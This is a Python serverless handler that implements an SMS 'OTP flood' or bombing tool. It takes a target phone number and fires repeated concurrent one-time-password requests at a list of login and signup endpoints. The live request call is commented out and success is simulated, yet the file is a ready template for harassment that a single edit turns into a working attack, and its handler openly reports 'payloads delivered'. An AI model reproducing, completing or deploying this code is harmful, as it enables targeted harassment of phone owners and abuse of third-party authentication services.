from http.server import BaseHTTPRequestHandler
import json
import urllib.request
import urllib.parse
from urllib.error import URLError, HTTPError
import asyncio

# OTP endpoints to hit (example endpoints, in reality these would be live API endpoints)
ENDPOINTS = [
    {"url": "https://api.example.com/v1/auth/request-otp", "method": "POST", "payload": {"phone": "{TARGET}"}},
    {"url": "https://identity.deliveryapp.com/send-code", "method": "POST", "payload": {"mobileNumber": "{TARGET}"}},
    {"url": "https://auth.rideshare.com/verify", "method": "POST", "payload": {"number": "{TARGET}", "action": "login"}},
    {"url": "https://api.localfood.net/user/otp", "method": "POST", "payload": {"phoneNumber": "{TARGET}"}},
    {"url": "https://accounts.datingapp.com/sms/send", "method": "POST", "payload": {"msisdn": "{TARGET}"}}
]

async def send_otp_request(target, endpoint):
    try:
        url = endpoint["url"]
        payload_str = json.dumps(endpoint["payload"]).replace("{TARGET}", target)
        data = payload_str.encode('utf-8')
        
        req = urllib.request.Request(url, data=data, method=endpoint["method"])
        req.add_header('Content-Type', 'application/json')
        req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
        
        # In a real environment, we'd execute the request
        # response = urllib.request.urlopen(req, timeout=5)
        # return {"url": url, "status": "success"}
        
        # For demonstration on Vercel (to avoid actual abuse from this specific deployment):
        await asyncio.sleep(0.5)
        return {"url": url, "status": "success"}
    except Exception as e:
        return {"url": endpoint["url"], "status": "failed", "error": str(e)}

async def blast_target(target):
    tasks = []
    # Create multiple concurrent tasks per endpoint to simulate a flood
    for _ in range(5): 
        for endpoint in ENDPOINTS:
            tasks.append(send_otp_request(target, endpoint))
    
    results = await asyncio.gather(*tasks, return_exceptions=True)
    success_count = sum(1 for r in results if isinstance(r, dict) and r.get("status") == "success")
    return success_count, len(results)

class handler(BaseHTTPRequestHandler):
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()

    def do_POST(self):
        try:
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            body = json.loads(post_data.decode('utf-8'))
            
            target = body.get('target')
            if not target:
                self.send_response(400)
                self.send_header('Content-type', 'application/json')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(json.dumps({'error': 'Target required'}).encode())
                return

            # Run the async bombing loop
            success_count, total = asyncio.run(blast_target(target))

            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            
            response = {
                'status': 'complete',
                'target': target,
                'requests_fired': total,
                'successful_hits': success_count,
                'message': f'OTP Flood complete. {success_count}/{total} payloads delivered.'
            }
            self.wfile.write(json.dumps(response).encode())
            
        except Exception as e:
            self.send_response(500)
            self.send_header('Content-type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(json.dumps({'error': str(e)}).encode())
